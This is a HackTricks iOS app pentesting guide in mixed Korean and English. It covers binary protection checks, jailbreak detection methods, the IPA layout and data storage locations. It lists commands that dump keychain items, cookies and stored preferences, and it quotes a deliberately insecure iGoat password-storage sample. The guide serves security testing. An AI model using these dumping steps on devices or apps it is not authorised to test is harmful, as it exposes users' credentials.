# iOS Pentesting

{{#include ../../banners/hacktricks-training.md}}

## iOS Basics


{{#ref}}
ios-basics.md
{{#endref}}

## Testing Environment

이 페이지에서는 **iOS 시뮬레이터**, **emulators** 및 **jailbreaking**에 대한 정보를 확인할 수 있습니다:


{{#ref}}
ios-testing-environment.md
{{#endref}}

## Initial Analysis

### Basic iOS Testing Operations

테스트 동안 **여러 작업들이 제안됩니다** (디바이스에 연결, 파일 읽기/쓰기/업로드/다운로드, 도구 사용 등...). 따라서 이러한 작업들 중 수행 방법을 모르는 항목이 있다면, **다음 페이지를 먼저 읽으세요**:


{{#ref}}
basic-ios-testing-operations.md
{{#endref}}

> [!TIP]
> 다음 단계들을 진행하기 위해서는 **앱이 기기에 설치되어 있어야** 하며, 애플리케이션의 **IPA file**을 이미 확보해야 합니다.\
> 이 작업을 수행하는 방법은 [Basic iOS Testing Operations](basic-ios-testing-operations.md) 페이지를 읽어보세요.

### Basic Static Analysis

유용한 iOS - IPA 파일 디컴파일러 예시:

- [https://github.com/LaurieWired/Malimite](https://github.com/LaurieWired/Malimite)
- [https://ghidra-sre.org/](https://ghidra-sre.org/)

자동 Static Analysis를 위해 [**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF) 도구 사용을 권장합니다.

바이너리에 어떤 **protections**가 있는지 식별하기:

- **PIE (Position Independent Executable)**: 활성화되어 있으면, 애플리케이션이 실행될 때마다 임의의 메모리 주소에 로드되어 초기 메모리 주소를 예측하기 어렵게 만듭니다.

```bash
otool -hv <app-binary> | grep PIE   # It should include the PIE flag
```

- **Stack Canaries**: 스택의 무결성을 검증하기 위해 함수 호출 전에 'canary' 값을 스택에 두고 함수가 끝날 때 다시 검증합니다.

```bash
otool -I -v <app-binary> | grep stack_chk   # It should include the symbols: stack_chk_guard and stack_chk_fail
```

- **ARC (Automatic Reference Counting)**: 일반적인 메모리 손상 취약점을 방지하기 위한 메커니즘

```bash
otool -I -v <app-binary> | grep objc_release   # It should include the _objc_release symbol
```

- **Encrypted Binary**: 바이너리는 암호화되어 있어야 합니다

```bash
otool -arch all -Vl <app-binary> | grep -A5 LC_ENCRYPT   # The cryptid should be 1
```

**민감하거나 취약한 함수 식별**

- **Weak Hashing Algorithms**

```bash
# On the iOS device
otool -Iv <app> | grep -w "_CC_MD5"
otool -Iv <app> | grep -w "_CC_SHA1"

# On linux
grep -iER "_CC_MD5"
grep -iER "_CC_SHA1"
```

- **Insecure Random Functions**

```bash
# On the iOS device
otool -Iv <app> | grep -w "_random"
otool -Iv <app> | grep -w "_srand"
otool -Iv <app> | grep -w "_rand"

# On linux
grep -iER "_random"
grep -iER "_srand"
grep -iER "_rand"
```

- **Insecure ‘Malloc’ Function**

```bash
# On the iOS device
otool -Iv <app> | grep -w "_malloc"

# On linux
grep -iER "_malloc"
```

- **Insecure and Vulnerable Functions**

```bash
# On the iOS device
otool -Iv <app> | grep -w "_gets"
otool -Iv <app> | grep -w "_memcpy"
otool -Iv <app> | grep -w "_strncpy"
otool -Iv <app> | grep -w "_strlen"
otool -Iv <app> | grep -w "_vsnprintf"
otool -Iv <app> | grep -w "_sscanf"
otool -Iv <app> | grep -w "_strtok"
otool -Iv <app> | grep -w "_alloca"
otool -Iv <app> | grep -w "_sprintf"
otool -Iv <app> | grep -w "_printf"
otool -Iv <app> | grep -w "_vsprintf"

# On linux
grep -R "_gets"
grep -iER "_memcpy"
grep -iER "_strncpy"
grep -iER "_strlen"
grep -iER "_vsnprintf"
grep -iER "_sscanf"
grep -iER "_strtok"
grep -iER "_alloca"
grep -iER "_sprintf"
grep -iER "_printf"
grep -iER "_vsprintf"
```

#### Common Jailbreak detection methods

- **File System Checks**: `/Applications/Cydia.app` 또는 `/Library/MobileSubstrate/MobileSubstrate.dylib` 같은 일반적인 jailbreak 파일과 디렉터리의 존재 여부를 확인합니다.
- **Sandbox Violations**: 비-탈옥 디바이스에서는 차단되어야 하는 파일 시스템의 제한 구역에 접근을 시도합니다.
- **API Checks**: `fork()`로 자식 프로세스를 생성하거나 `system()`으로 /bin/sh 존재를 확인하는 등 금지된 호출을 사용할 수 있는지 확인합니다.
- **Process Checks**: `Cydia`, `Substrate`, `ssh` 같은 알려진 jailbreak 관련 프로세스의 존재를 모니터링합니다.
- **Kernel Exploits**: 일반적으로 jailbreak에 사용되는 커널 익스플로잇의 존재를 확인합니다.
- **Environment Variables**: `DYLD_INSERT_LIBRARIES`와 같은 jailbreak의 징후가 있는 환경 변수를 검사합니다.
- **Libraries Check**: 앱 프로세스에 로드된 라이브러리들을 확인합니다.
- **Check schemes**: 예를 들어 `canOpenURL(URL(string: "cydia://"))` 같은 방식으로 확인합니다.

#### Common Anti-Debugging detection methods

- **Check for Debugger Presence**: `sysctl` 또는 다른 방법을 사용해 디버거가 연결되어 있는지 확인합니다.
- **Anti-Debugging APIs**: `ptrace`나 `SIGSTOP` 같은 anti-debugging API 호출(예: `ptrace(PT_DENY_ATTACH, 0, 0, 0)`)의 사용을 확인합니다.
- **Timing Checks**: 특정 작업에 소요되는 시간을 측정하여 디버깅 여부를 의심할 만한 불일치를 찾습니다.
- **Memory Checks**: 알려진 디버거 아티팩트나 수정 흔적을 메모리에서 검사합니다.
- **Environment Variables**: 디버깅 세션을 나타낼 수 있는 환경 변수를 확인합니다.
- **Mach Ports**: 디버거가 mach exception ports를 사용하고 있는지 탐지합니다.

### Basic Dynamic Analysis

[**MobSF**](https://github.com/MobSF/Mobile-Security-Framework-MobSF)가 수행하는 dynamic analysis를 확인해보세요. 여러 뷰를 탐색하고 상호작용해야 하지만, 여러 클래스를 훅킹하고 다른 작업들을 수행하며 완료하면 리포트를 준비해줍니다.

### Listing Installed Apps

설치된 앱의 **bundle identifier**를 확인하려면 `frida-ps -Uai` 명령을 사용하세요:
```bash
$ frida-ps -Uai
PID  Name                 Identifier
----  -------------------  -----------------------------------------
6847  Calendar             com.apple.mobilecal
6815  Mail                 com.apple.mobilemail
-  App Store            com.apple.AppStore
-  Apple Store          com.apple.store.Jolly
-  Calculator           com.apple.calculator
-  Camera               com.apple.camera
-  iGoat-Swift          OWASP.iGoat-Swift
```
### Basic Enumeration & Hooking

애플리케이션의 구성 요소를 **enumerate the components of the application**하는 방법과 objection을 사용해 메소드와 클래스를 쉽게 **hook methods and classes**하는 방법을 배우세요:

{{#ref}}
ios-hooking-with-objection.md
{{#endref}}

### IPA 구조

**IPA 파일**의 구조는 본질적으로 **zipped package**의 구조와 같습니다. 확장자를 `.zip`으로 바꾸면 내용을 **decompress**하여 내부를 확인할 수 있습니다. 이 구조 안에서 **Bundle**은 설치 가능한 완전한 패키지된 애플리케이션을 의미합니다. 내부에는 애플리케이션 리소스를 포함하는 `<NAME>.app` 디렉토리가 있습니다.

- **`Info.plist`**: 애플리케이션의 특정 구성 세부 정보를 담고 있는 파일입니다.
- **`_CodeSignature/`**: 번들 내 모든 파일의 무결성을 보장하는 서명을 포함한 plist 파일을 포함하는 디렉토리입니다.
- **`Assets.car`**: 아이콘과 같은 자산 파일을 저장하는 압축 아카이브입니다.
- **`Frameworks/`**: `.dylib` 또는 `.framework` 형식의 네이티브 라이브러리를 포함하는 폴더입니다.
- **`PlugIns/`**: `.appex` 파일로 알려진 앱 확장을 포함할 수 있는 디렉토리로 항상 존재하는 것은 아닙니다. \* [**`Core Data`**](https://developer.apple.com/documentation/coredata): 오프라인 사용을 위해 애플리케이션의 영구 데이터를 저장하거나 임시 데이터를 캐시하고, 단일 디바이스에서 undo 기능을 추가하는 데 사용됩니다. 동일한 iCloud 계정의 여러 디바이스 간에 데이터를 동기화하기 위해 Core Data는 자동으로 스키마를 CloudKit 컨테이너에 미러링합니다.
- [**`PkgInfo`**](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPRuntimeConfig/Articles/ConfigApplications.html): `PkgInfo` 파일은 애플리케이션이나 번들의 type 및 creator 코드를 지정하는 대체 방법입니다.
- **en.lproj, fr.proj, Base.lproj**: 특정 언어에 대한 리소스를 포함하는 언어 팩이며, 해당 언어가 지원되지 않을 경우를 대비한 기본 리소스입니다.
- **보안**: `_CodeSignature/` 디렉토리는 디지털 서명을 통해 번들된 모든 파일의 무결성을 검증함으로써 앱 보안에서 중요한 역할을 합니다.
- **자산 관리**: `Assets.car` 파일은 그래픽 자산을 효율적으로 관리하기 위해 압축을 사용하며, 이는 애플리케이션 성능 최적화와 전체 크기 감소에 중요합니다.
- **Frameworks 및 PlugIns**: 이러한 디렉토리는 iOS 애플리케이션의 모듈성을 강조하며, 재사용 가능한 코드 라이브러리(`Frameworks/`)를 포함하고 앱 기능을 확장하는(`PlugIns/`) 것을 허용합니다.
- **현지화**: 구조는 여러 언어를 지원하도록 설계되어 특정 언어 팩의 리소스를 포함함으로써 글로벌 앱 배포를 용이하게 합니다.

**Info.plist**

**Info.plist**는 iOS 애플리케이션의 핵심 요소로서 **키-값 쌍(key-value pairs)** 형태로 주요 구성 데이터를 캡슐화합니다. 이 파일은 애플리케이션뿐만 아니라 번들에 포함된 앱 확장과 프레임워크에도 필수적입니다. XML 또는 binary 형식으로 구조화되며, 앱 권한에서부터 보안 구성에 이르기까지 중요한 정보를 포함합니다. 사용 가능한 키에 대한 자세한 내용은 [**Apple Developer Documentation**](https://developer.apple.com/documentation/bundleresources/information_property_list?language=objc)을 참조할 수 있습니다.

이 파일을 보다 접근하기 쉬운 형식으로 작업하려는 경우, macOS에서는 기본 제공되는 `plutil`을, Linux에서는 `plistutil`을 사용하여 XML 변환을 쉽게 수행할 수 있습니다. 변환 명령은 다음과 같습니다:

- **macOS의 경우**:
```bash
$ plutil -convert xml1 Info.plist
```
- **Linux용**:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Info.plist** 파일이 공개할 수 있는 수많은 정보 중에서 주목할 만한 항목으로는 앱 권한 문자열 (`UsageDescription`), 커스텀 URL 스킴 (`CFBundleURLTypes`), App Transport Security 구성 (`NSAppTransportSecurity`) 등이 있습니다. 이러한 항목들은 `UTExportedTypeDeclarations` / `UTImportedTypeDeclarations` 같은 내보내기/가져오기 커스텀 문서 타입과 함께 파일을 직접 살펴보거나 간단한 `grep` 명령을 사용하여 손쉽게 찾을 수 있습니다:
```bash
$ grep -i <keyword> Info.plist
```
**Data Paths**

In the iOS environment, directories are designated specifically for **system applications** and **user-installed applications**. System applications reside in the `/Applications` directory, while user-installed apps are placed under `/var/mobile/containers/Data/Application/`. These applications are assigned a unique identifier known as a **128-bit UUID**, making the task of manually locating an app's folder challenging due to the randomness of the directory names.

> [!WARNING]
> As applications in iOS must be sandboxed, each app will have also a folder inside **`$HOME/Library/Containers`** with app's **`CFBundleIdentifier`** as the folder name.
>
> However, both folders (data & container folders) have the file **`.com.apple.mobile_container_manager.metadata.plist`** that links both files in the key `MCMetadataIdentifier`).

To facilitate the discovery of a user-installed app's installation directory, the **objection tool** provides a useful command, `env`. This command reveals detailed directory information for the app in question. Below is an example of how to use this command:
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # env

Name               Path
-----------------  -------------------------------------------------------------------------------------------
BundlePath         /var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app
CachesDirectory    /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library/Caches
DocumentDirectory  /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Documents
LibraryDirectory   /var/mobile/Containers/Data/Application/8C8E7EB0-BC9B-435B-8EF8-8F5560EB0693/Library
```
또는 `find` 명령을 사용하여 `/private/var/containers` 내에서 앱 이름을 검색할 수 있습니다:
```bash
find /private/var/containers -name "Progname*"
```
`ps` 및 `lsof`와 같은 명령은 각각 앱의 프로세스를 식별하고 열린 파일을 나열하는 데 사용되어 애플리케이션의 활성 디렉터리 경로에 대한 통찰을 제공합니다:
```bash
ps -ef | grep -i <app-name>
lsof -p <pid> | grep -i "/containers" | head -n 1
```
**Bundle directory:**

- **AppName.app**
- 이는 IPA에서 본 Application Bundle로, 필수 애플리케이션 데이터, 정적 콘텐츠 및 애플리케이션의 컴파일된 바이너리를 포함합니다.
- 이 디렉터리는 사용자에게 보이지만, **사용자는 여기에 쓸 수 없습니다**.
- 이 디렉터리의 콘텐츠는 **백업되지 않습니다**.
- 이 폴더의 내용은 **코드 서명 검증**에 사용됩니다.

**Data directory:**

- **Documents/**
- 모든 사용자 생성 데이터를 포함합니다. 이 데이터는 애플리케이션 최종 사용자가 생성합니다.
- 사용자에게 보이며 **사용자는 여기에 쓸 수 있습니다**.
- 이 디렉터리의 콘텐츠는 **백업됩니다**.
- 앱은 `NSURLIsExcludedFromBackupKey`를 설정하여 경로를 백업에서 제외할 수 있습니다.
- **Library/**
- **사용자별이 아닌 파일들**(예: **caches**, **preferences**, **cookies**, 및 property list (plist) 설정 파일)을 포함합니다.
- iOS 앱은 보통 `Application Support` 및 `Caches` 하위 디렉터리를 사용하지만, 앱이 커스텀 하위 디렉터리를 생성할 수 있습니다.
- **Library/Caches/**
- **반영구적 캐시 파일**을 포함합니다.
- 사용자에게 보이지 않으며 **사용자는 여기에 쓸 수 없습니다**.
- 이 디렉터리의 콘텐츠는 **백업되지 않습니다**.
- 앱이 실행 중이 아니고 저장 공간이 부족하면 OS가 이 디렉터리의 파일을 자동으로 삭제할 수 있습니다.
- **Library/Application Support/**
- 앱 실행에 필요한 **영구적인 파일**을 포함합니다.
- **사용자에게 보이지 않으며** 사용자가 여기에 쓸 수 없습니다.
- 이 디렉터리의 콘텐츠는 **백업됩니다**.
- 앱은 `NSURLIsExcludedFromBackupKey`를 설정하여 경로를 백업에서 제외할 수 있습니다.
- **Library/Preferences/**
- 애플리케이션이 재시작된 이후에도 **지속될 수 있는 속성**을 저장하는 데 사용됩니다.
- 정보는 애플리케이션 샌드박스 내부의 plist 파일인 \[BUNDLE_ID].plist에 암호화되지 않은 상태로 저장됩니다.
- `NSUserDefaults`를 사용해 저장된 모든 키/값 쌍은 이 파일에서 찾을 수 있습니다.
- **tmp/**
- 앱 실행 간에 유지할 필요가 없는 **임시 파일**을 쓰기 위해 이 디렉터리를 사용하세요.
- 비영구적 캐시 파일을 포함합니다.
- **사용자에게 보이지 않습니다**.
- 이 디렉터리의 콘텐츠는 백업되지 않습니다.
- 앱이 실행 중이 아니고 저장 공간이 부족하면 OS가 이 디렉터리의 파일을 자동으로 삭제할 수 있습니다.

Let's take a closer look at iGoat-Swift's Application Bundle (.app) directory inside the Bundle directory (`/var/containers/Bundle/Application/3ADAF47D-A734-49FA-B274-FBCA66589E67/iGoat-Swift.app`):
```bash
OWASP.iGoat-Swift on (iPhone: 11.1.2) [usb] # ls
NSFileType      Perms  NSFileProtection    ...  Name
------------  -------  ------------------  ...  --------------------------------------
Regular           420  None                ...  rutger.html
Regular           420  None                ...  mansi.html
Regular           420  None                ...  splash.html
Regular           420  None                ...  about.html

Regular           420  None                ...  LICENSE.txt
Regular           420  None                ...  Sentinel.txt
Regular           420  None                ...  README.txt
```
### Binary Reversing

`<application-name>.app` 폴더 안에서 `<application-name>`라는 바이너리 파일을 찾을 수 있습니다. 이 파일이 실제로 **실행되는** 파일입니다. 도구 **`otool`**로 바이너리에 대한 기본 검사를 수행할 수 있습니다:
```bash
otool -Vh DVIA-v2 #Check some compilation attributes
magic  cputype cpusubtype  caps    filetype ncmds sizeofcmds      flags
MH_MAGIC_64    ARM64        ALL  0x00     EXECUTE    65       7112   NOUNDEFS DYLDLINK TWOLEVEL WEAK_DEFINES BINDS_TO_WEAK PIE

otool -L DVIA-v2 #Get third party libraries
DVIA-v2:
/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 400.9.1)
/usr/lib/libsqlite3.dylib (compatibility version 9.0.0, current version 274.6.0)
/usr/lib/libz.1.dylib (compatibility version 1.0.0, current version 1.2.11)
@rpath/Bolts.framework/Bolts (compatibility version 1.0.0, current version 1.0.0)
[...]
```
**앱이 암호화되어 있는지 확인하세요**

다음에 출력이 있는지 확인하세요:
```bash
otool -l <app-binary> | grep -A 4 LC_ENCRYPTION_INFO
```
**바이너리 역어셈블**

text section을 역어셈블하세요:
```bash
otool -tV DVIA-v2
DVIA-v2:
(__TEXT,__text) section
+[DDLog initialize]:
0000000100004ab8    sub    sp, sp, #0x60
0000000100004abc    stp    x29, x30, [sp, #0x50]   ; Latency: 6
0000000100004ac0    add    x29, sp, #0x50
0000000100004ac4    sub    x8, x29, #0x10
0000000100004ac8    mov    x9, #0x0
0000000100004acc    adrp    x10, 1098 ; 0x10044e000
0000000100004ad0    add    x10, x10, #0x268
```
샘플 애플리케이션의 **Objective-C 부분**을 출력하려면 다음을 사용할 수 있습니다:
```bash
otool -oV DVIA-v2
DVIA-v2:
Contents of (__DATA,__objc_classlist) section
00000001003dd5b8 0x1004423d0 _OBJC_CLASS_$_DDLog
isa        0x1004423a8 _OBJC_METACLASS_$_DDLog
superclass 0x0 _OBJC_CLASS_$_NSObject
cache      0x0 __objc_empty_cache
vtable     0x0
data       0x1003de748
flags          0x80
instanceStart  8
```
더 간결한 Objective-C 코드를 얻기 위해 [**class-dump**](http://stevenygard.com/projects/class-dump/)을 사용할 수 있습니다:
```bash
class-dump some-app
//
//     Generated by class-dump 3.5 (64 bit).
//
//     class-dump is Copyright (C) 1997-1998, 2000-2001, 2004-2013 by Steve Nygard.
//

#pragma mark Named Structures

struct CGPoint {
double _field1;
double _field2;
};

struct CGRect {
struct CGPoint _field1;
struct CGSize _field2;
};

struct CGSize {
double _field1;
double _field2;
};
```
However, the best options to disassemble the binary are: [**Hopper**](https://www.hopperapp.com/download.html?) and [**IDA**](https://www.hex-rays.com/products/ida/support/download_freeware/).

## 데이터 저장

To learn about how iOS stores data in the device read this page:


{{#ref}}
ios-basics.md
{{#endref}}

> [!WARNING]
> 다음 정보 저장 위치는 애플리케이션을 **설치한 직후**, 애플리케이션의 **모든 기능을 확인한 후**, 심지어 **한 사용자에서 로그아웃하고 다른 사용자로 로그인한 후**에도 확인해야 합니다.\
> 목표는 애플리케이션(비밀번호, 토큰), 현재 사용자 및 이전에 로그인한 사용자의 **보호되지 않은 민감한 정보**를 찾는 것입니다.

### Plist

**plist** 파일은 구조화된 XML 파일로 **키-값 쌍을 포함합니다**. 이는 영구 데이터를 저장하는 방법이므로 때때로 **이 파일들에서 민감한 정보를 발견할 수 있습니다**. 새로운 데이터가 기록되는지 확인하기 위해 앱 설치 후와 집중적으로 사용한 후에 이 파일들을 확인하는 것이 권장됩니다.

The most common way to persist data in plist files is through the usage of **NSUserDefaults**. This plist file is saved inside the app sandbox in **`Library/Preferences/<appBundleID>.plist`**

The [`NSUserDefaults`](https://developer.apple.com/documentation/foundation/nsuserdefaults) class provides a programmatic interface for interacting with the default system. The default system allows an application to customize its behaviour according to **user preferences**. Data saved by `NSUserDefaults` can be viewed in the application bundle. This class stores **data** in a **plist** **file**, but it's meant to be used with small amounts of data.

This data cannot be longer accessed directly via a trusted computer, but can be accessed performing a **backup**.

You can **dump** the information saved using **`NSUserDefaults`** using objection's `ios nsuserdefaults get`

To find all the plist of used by the application you can access to `/private/var/mobile/Containers/Data/Application/{APPID}` and run:
```bash
find ./ -name "*.plist"
```
파일을 **XML or binary (bplist)** 형식에서 XML로 변환하려면 운영체제에 따라 여러 방법이 있습니다:

**macOS 사용자용:** `plutil` 명령을 사용하세요. 이는 macOS(10.2+)에 내장된 도구로, 이 목적을 위해 설계되었습니다:
```bash
$ plutil -convert xml1 Info.plist
```
**Linux 사용자의 경우:** 먼저 `libplist-utils`를 설치한 다음, `plistutil`을 사용하여 파일을 변환하세요:
```bash
$ apt install libplist-utils
$ plistutil -i Info.plist -o Info_xml.plist
```
**Objection 세션에서:** 모바일 애플리케이션을 분석할 때, 특정 명령어로 plist 파일을 직접 변환할 수 있습니다:
```bash
ios plist cat /private/var/mobile/Containers/Data/Application/<Application-UUID>/Library/Preferences/com.some.package.app.plist
```
### Core Data

[`Core Data`](https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/CoreData/nsfetchedresultscontroller.html#//apple_ref/doc/uid/TP40001075-CH8-SW1)는 애플리케이션의 객체 모델 계층을 관리하기 위한 프레임워크입니다. [Core Data can use SQLite as its persistent store](https://cocoacasts.com/what-is-the-difference-between-core-data-and-sqlite/), 하지만 프레임워크 자체는 데이터베이스가 아닙니다.\
CoreData는 기본적으로 데이터를 암호화하지 않습니다. 그러나 추가 암호화 레이어를 CoreData에 추가할 수 있습니다. 자세한 내용은 [GitHub Repo](https://github.com/project-imas/encrypted-core-data)를 참조하세요.

애플리케이션의 SQLite Core Data 정보는 경로 `/private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support`에서 찾을 수 있습니다.

**SQLite를 열어 민감한 정보에 접근할 수 있다면, 이는 잘못된 구성입니다.**
```objectivec:Code from iGoat
-(void)storeDetails {
AppDelegate * appDelegate = (AppDelegate *)(UIApplication.sharedApplication.delegate);

NSManagedObjectContext *context =[appDelegate managedObjectContext];

User *user = [self fetchUser];
if (user) {
return;
}
user = [NSEntityDescription insertNewObjectForEntityForName:@"User"
inManagedObjectContext:context];
user.email = CoreDataEmail;
user.password = CoreDataPassword;
NSError *error;
if (![context save:&error]) {
NSLog(@"Error in saving data: %@", [error localizedDescription]);

}else{
NSLog(@"data stored in core data");
}
}
```
### YapDatabase

[YapDatabase](https://github.com/yapstudios/YapDatabase)는 SQLite 위에 구축된 키/값 스토어입니다.\
Yap 데이터베이스는 sqlite 데이터베이스이므로 이전 섹션에서 제시한 명령을 사용해 찾을 수 있습니다.

### 기타 SQLite 데이터베이스

애플리케이션이 자체 sqlite 데이터베이스를 생성하는 것은 흔합니다. 이들은 **저장** **민감한** **데이터**를 그 안에 보관하고 암호화되지 않은 채로 둘 수 있습니다. 따라서 애플리케이션 디렉터리 내부의 모든 데이터베이스를 확인해 보는 것이 항상 유용합니다. 따라서 데이터가 저장된 애플리케이션 디렉터리로 이동하세요 (`/private/var/mobile/Containers/Data/Application/{APPID}`)
```bash
find ./ -name "*.sqlite" -or -name "*.db"
```
### Firebase Real-Time Databases

개발자는 Firebase Real-Time Databases를 통해 **데이터를 저장하고 동기화**할 수 있는 **NoSQL cloud-hosted database**를 이용할 수 있습니다. 데이터는 JSON 형식으로 저장되며, 연결된 모든 클라이언트에 실시간으로 동기화됩니다.

You can find how to check for misconfigured Firebase databases here:


{{#ref}}
../../network-services-pentesting/pentesting-web/buckets/firebase-database.md
{{#endref}}

### Realm databases

[Realm Objective-C](https://realm.io/docs/objc/latest/) and [Realm Swift](https://realm.io/docs/swift/latest/)는 Apple에서 제공하지 않는 데이터 저장을 위한 강력한 대안을 제공합니다. 기본적으로 **데이터를 암호화하지 않고 저장**하며, 특정 구성으로 암호화를 사용할 수 있습니다.

The databases are located at: `/private/var/mobile/Containers/Data/Application/{APPID}`. To explore these files, one can utilize commands like:
```bash
iPhone:/private/var/mobile/Containers/Data/Application/A079DF84-726C-4AEA-A194-805B97B3684A/Documents root# ls
default.realm  default.realm.lock  default.realm.management/  default.realm.note|

$ find ./ -name "*.realm*"
```
이러한 데이터베이스 파일을 보려면 [**Realm Studio**](https://github.com/realm/realm-studio) 도구를 권장합니다.

Realm 데이터베이스에 암호화를 적용하려면 다음 코드 스니펫을 사용할 수 있습니다:
```swift
// Open the encrypted Realm file where getKey() is a method to obtain a key from the Keychain or a server
let config = Realm.Configuration(encryptionKey: getKey())
do {
let realm = try Realm(configuration: config)
// Use the Realm as normal
} catch let error as NSError {
// If the encryption key is wrong, `error` will say that it's an invalid database
fatalError("Error opening realm: \(error)")
}
```
### Couchbase Lite 데이터베이스

[Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios)는 **경량** 및 **임베디드** 데이터베이스 엔진으로, **문서 지향** (NoSQL) 방식을 따릅니다. **iOS** 및 **macOS**에 네이티브로 설계되어 원활한 데이터 동기화 기능을 제공합니다.

기기에서 잠재적인 Couchbase 데이터베이스를 식별하려면 다음 디렉터리를 확인하십시오:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### 쿠키

iOS는 각 앱 폴더 내의 **`Library/Cookies/cookies.binarycookies`**에 앱의 쿠키를 저장합니다. 하지만 개발자는 때때로 이를 **keychain**에 저장하기로 결정하는데, 언급한 **cookie 파일은 백업에서 접근할 수 있기 때문입니다**.

쿠키 파일을 검사하려면 [**this python script**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) 또는 objection의 **`ios cookies get`.**\
**objection을 사용하여** 이러한 파일을 JSON 형식으로 변환하고 데이터를 검사할 수도 있습니다.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Cache

기본적으로 NSURLSession은 **Cache.db에 있는 HTTP 요청 및 응답**과 같은 데이터를 저장합니다. 이 데이터베이스에는 토큰, 사용자명 또는 기타 민감한 정보가 캐시되어 있다면 **민감한 데이터**가 포함될 수 있습니다. 캐시된 정보를 찾으려면 앱의 데이터 디렉터리(`/var/mobile/Containers/Data/Application/<UUID>`)를 열고 `/Library/Caches/<Bundle Identifier>`로 이동하세요. **WebKit 캐시도 Cache.db에 저장됩니다.** **Objection**은 `sqlite connect Cache.db` 명령으로 데이터베이스를 열고 상호작용할 수 있습니다. 이는 **정상적인 SQLite 데이터베이스**이기 때문입니다.

요청 또는 응답에 민감한 정보가 포함될 수 있으므로 이러한 데이터를 캐싱하지 않도록 하는 것이 권장됩니다. 아래 목록은 이를 달성하는 여러 방법을 보여줍니다:

1.  로그아웃 후 캐시된 응답을 제거하는 것이 권장됩니다. Apple에서 제공하는 [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses) 메서드로 이를 수행할 수 있습니다. 다음과 같이 호출할 수 있습니다:

`URLCache.shared.removeAllCachedResponses()`

이 메서드는 Cache.db 파일에서 모든 캐시된 요청과 응답을 제거합니다.

2.  쿠키의 이점을 사용할 필요가 없다면 URLSession의 [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) 구성 속성을 사용하는 것이 권장됩니다. 이 설정은 쿠키와 캐시 저장을 비활성화합니다.

[Apple documentation](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`An ephemeral session configuration object is similar to a default session configuration (see default), except that the corresponding session object doesn’t store caches, credential stores, or any session-related data to disk. Instead, session-related data is stored in RAM. The only time an ephemeral session writes data to disk is when you tell it to write the contents of a URL to a file.`

3.  Cache Policy를 [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed)으로 설정하여 캐시를 비활성화할 수도 있습니다. 이는 메모리나 디스크에 어떠한 형태로든 캐시를 저장하는 것을 차단합니다.

### Snapshots

홈 버튼을 누를 때마다 iOS는 앱 전환을 부드럽게 하기 위해 현재 화면의 스냅샷을 찍습니다. 그러나 현재 화면에 **민감한** **데이터**가 있으면 해당 **이미지**에 **저장**되며(재부팅 후에도 **지속**됩니다) 이러한 스냅샷은 홈 버튼을 두 번 눌러 앱 전환 화면에서 접근할 수 있습니다.

iPhone이 탈옥되어 있지 않다면, 스냅샷을 보려면 **공격자**가 기기의 **잠금 해제된 접근**을 가지고 있어야 합니다. 기본적으로 마지막 스냅샷은 앱 샌드박스의 `Library/Caches/Snapshots/` 또는 `Library/SplashBoard/Snapshots` 폴더에 저장됩니다(신뢰된 컴퓨터는 iOS 7.0부터 파일시스템에 접근할 수 없습니다).

이러한 문제를 방지하는 한 가지 방법은 `ApplicationDidEnterBackground()` 함수를 사용하여 스냅샷을 찍기 전에 빈 화면을 표시하거나 민감한 데이터를 제거하는 것입니다.

다음은 기본 스크린샷을 설정하는 예시 수정 메서드입니다.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
이 설정은 애플리케이션이 백그라운드 상태가 될 때마다 배경 이미지를 `overlayImage.png`로 설정합니다. `overlayImage.png`가 항상 현재 뷰를 덮어쓰므로 민감한 데이터의 leaks를 방지합니다.

### Keychain

iOS keychain에 접근하고 관리하기 위해 [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper)와 같은 도구들이 있으며, 주로 jailbroken devices에서 사용됩니다. 또한 [**Objection**](https://github.com/sensepost/objection)는 유사한 용도로 `ios keychain dump` 명령을 제공합니다.

#### **자격 증명 저장**

**NSURLCredential** 클래스는 NSUserDefaults나 다른 래퍼를 거치지 않고 민감한 정보를 keychain에 직접 저장하는 데 적합합니다. 로그인 후 자격 증명을 저장하려면 다음 Swift 코드를 사용합니다:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
